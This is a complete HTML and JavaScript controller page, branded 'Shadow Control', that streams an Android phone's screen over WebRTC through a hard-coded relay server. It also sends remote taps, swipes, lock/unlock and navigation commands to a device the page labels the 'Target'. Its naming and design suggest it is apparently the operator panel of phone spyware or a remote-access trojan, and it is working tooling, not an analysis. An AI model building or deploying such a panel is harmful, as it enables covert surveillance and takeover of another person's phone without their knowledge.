<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Shadow Control - Live Stream</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>

    <style>
        :root {
            --bg-color: #050505;
            --panel-bg: #1a1a1a;
            --accent: #00ff88;
            --danger: #ff3333;
            --text-main: #ffffff;
        }

        body {
            margin: 0; background-color: var(--bg-color); color: var(--text-main);
            font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
        }

        /* --- Header --- */
        .top-nav {
            padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
            display: flex; justify-content: space-between; align-items: center; z-index: 10;
        }
        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
        .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }

        /* --- Main Layout --- */
        .screen-container {
            flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
        }

        /* --- Phone Frame --- */
        .phone-frame {
            width: 320px; height: 680px; /* Slightly taller for modern phones */
            border: 8px solid #222; border-radius: 30px;
            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
            overflow: hidden; display: flex; align-items: center; justify-content: center;
        }
        
        /* ðŸ”¥ VIDEO PLAYER (WebRTC) ðŸ”¥ */
        #remoteVideo {
            width: 100%;
            height: 100%;
            object-fit: contain; /* Aspect ratio maintain karega */
            background-color: #000;
            cursor: pointer; /* Clickable dikhane ke liye */
        }
        
        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; pointer-events: none; }

        /* --- Controls --- */
        .side-panel {
            position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
            background: rgba(26, 26, 26, 0.8); padding: 15px; border-radius: 20px; border: 1px solid #333;
        }
        .control-btn {
            width: 50px; height: 50px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
            color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
        }
        .control-btn:hover { border-color: var(--accent); color: var(--accent); transform: scale(1.1); }
        .control-btn:active { transform: scale(0.9); }

        /* Navigation Bar */
        .nav-bar {
            width: 100%; height: 50px; background: rgba(0, 0, 0, 0.8);
            position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222;
        }
        .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; padding: 10px; }
        .nav-item:hover { color: white; }

        @media (max-width: 768px) {
            .screen-container { flex-direction: column; }
            .side-panel { position: relative; right: auto; flex-direction: row; margin-top: 20px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 300px; }
            .phone-frame { width: 100%; max-width: 320px; height: auto; aspect-ratio: 9/19; }
        }
    </style>
</head>
<body>

    <div class="top-nav">
        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW</div>
        <div class="status-badge">
            <span class="live-dot" id="dot"></span> 
            <span id="statusText" style="color:#888">Waiting for connection...</span>
        </div>
    </div>

    <div class="screen-container">
        <div class="phone-frame">
            <div id="offlineMsg" class="offline-msg">
                <i class="fa-solid fa-video-slash fa-2x"></i>
                <p style="margin-top:10px" id="msgText">Waiting for Stream...</p>
            </div>
            
            <video id="remoteVideo" autoplay playsinline muted></video>
            
            <div class="nav-bar">
                <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
                <div class="nav-item" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
            </div>
        </div>

        <div class="side-panel">
            <div class="control-btn" onclick="sendCommand('lock')" title="Lock Screen"><i class="fa-solid fa-lock"></i></div>
            <div class="control-btn" onclick="sendCommand('unlock')" title="Wake Screen"><i class="fa-solid fa-lock-open"></i></div>
            <div class="control-btn" onclick="sendCommand('volume_up')" title="Vol +"><i class="fa-solid fa-plus"></i></div>
            <div class="control-btn" onclick="sendCommand('volume_down')" title="Vol -"><i class="fa-solid fa-minus"></i></div>
            <div class="control-btn" onclick="sendCommand('swipe_up')" title="Swipe Up"><i class="fa-solid fa-arrow-up"></i></div>
            <div class="control-btn" onclick="sendCommand('swipe_down')" title="Swipe Down"><i class="fa-solid fa-arrow-down"></i></div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com"; 
        let socket = null;
        let currentDeviceId = null;
        let peerConnection;
        
        // STUN Servers (Free Google Servers)
        const rtcConfig = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        };

        const remoteVideo = document.getElementById('remoteVideo');

        window.addEventListener('load', function() {
            const urlParams = new URLSearchParams(window.location.search);
            currentDeviceId = urlParams.get('id'); // URL se ID lo

            if (currentDeviceId) {
                document.getElementById('statusText').innerText = "Target: " + currentDeviceId;
                startConnection();
            } else {
                document.getElementById('statusText').innerText = "No Device ID";
                document.getElementById('msgText').innerText = "Add ?id=12345 in URL";
            }
        });

        function startConnection() {
            socket = io(SERVER_URL, { 
                transports: ['websocket'], 
                reconnection: true
            });

            socket.on("connect", () => {
                console.log("âœ… Web Connected to Server");
                document.getElementById('statusText').innerText = "Connected to Server";
                document.getElementById('statusText').style.color = "var(--accent)";
                document.getElementById('dot').classList.add("active");
                
                // Viewer bankar join karo
                socket.emit("join-room", currentDeviceId);
            });

            // ðŸ”¥ 1. Wait for OFFER from Android
            socket.on("offer", async (offer) => {
                console.log("ðŸ“© Received Offer from Android");
                document.getElementById('offlineMsg').style.display = "none";

                if (peerConnection) peerConnection.close();
                peerConnection = new RTCPeerConnection(rtcConfig);

                // Jab stream aaye
                peerConnection.ontrack = (event) => {
                    console.log("ðŸŽ¥ Stream received!");
                    remoteVideo.srcObject = event.streams[0];
                };

                // Candidates wapis bhejo
                peerConnection.onicecandidate = (event) => {
                    if (event.candidate) {
                        socket.emit("candidate", {
                            target: currentDeviceId,
                            candidate: event.candidate
                        });
                    }
                };

                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                
                const answer = await peerConnection.createAnswer();
                await peerConnection.setLocalDescription(answer);
                
                socket.emit("answer", {
                    target: currentDeviceId,
                    answer: answer
                });
            });

            // ðŸ”¥ 2. Handle Candidates
            socket.on("candidate", async (candidate) => {
                if (peerConnection) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                    } catch (e) { console.error("Error adding candidate", e); }
                }
            });

            socket.on("disconnect", () => {
                console.log("âŒ Disconnected");
                document.getElementById('statusText').innerText = "Offline";
                document.getElementById('dot').classList.remove("active");
                document.getElementById('offlineMsg').style.display = "flex";
            });
        }

        // --- BUTTON COMMANDS ---
        function sendCommand(action) {
            if(!socket || !currentDeviceId) return;
            // Haptic feedback (if on mobile)
            if(navigator.vibrate) navigator.vibrate(50);
            
            socket.emit("control-event", {
                room: currentDeviceId,
                action: action,
                x: 0, y: 0
            });
        }

        // --- ðŸ”¥ PRO CLICK/TOUCH HANDLING ðŸ”¥ ---
        // Ye function 'object-fit: contain' ke bawajood sahi coordinates nikalta hai
        remoteVideo.addEventListener('click', (event) => {
            if(!socket || !currentDeviceId) return;

            const rect = remoteVideo.getBoundingClientRect();
            const videoWidth = remoteVideo.videoWidth;
            const videoHeight = remoteVideo.videoHeight;
            const elementWidth = rect.width;
            const elementHeight = rect.height;

            // Aspect Ratios
            const videoRatio = videoWidth / videoHeight;
            const elementRatio = elementWidth / elementHeight;

            let displayedWidth, displayedHeight;
            let startX = 0, startY = 0;

            // Calculate actual video size displayed on screen
            if (elementRatio > videoRatio) {
                // Letterboxing left/right (Black bars on sides)
                displayedHeight = elementHeight;
                displayedWidth = displayedHeight * videoRatio;
                startX = (elementWidth - displayedWidth) / 2;
            } else {
                // Letterboxing top/bottom (Black bars top/bottom)
                displayedWidth = elementWidth;
                displayedHeight = displayedWidth / videoRatio;
                startY = (elementHeight - displayedHeight) / 2;
            }

            // Click position relative to the video element
            const clickX = event.clientX - rect.left;
            const clickY = event.clientY - rect.top;

            // Check if click is inside the actual video area (ignore black bars)
            if (clickX >= startX && clickX <= startX + displayedWidth &&
                clickY >= startY && clickY <= startY + displayedHeight) {
                
                // Calculate percentage (0.0 to 1.0) relative to actual video
                const relX = (clickX - startX) / displayedWidth;
                const relY = (clickY - startY) / displayedHeight;

                // Scale to actual video resolution (Android resolution)
                const finalX = Math.round(relX * videoWidth);
                const finalY = Math.round(relY * videoHeight);

                console.log(`Sending Tap: X=${finalX}, Y=${finalY}`);

                socket.emit("control-event", {
                    room: currentDeviceId,
                    action: "tap", // Android "tap" action handle karega
                    x: finalX, 
                    y: finalY
                });
            }
        });

    </script>
</body>
</html>
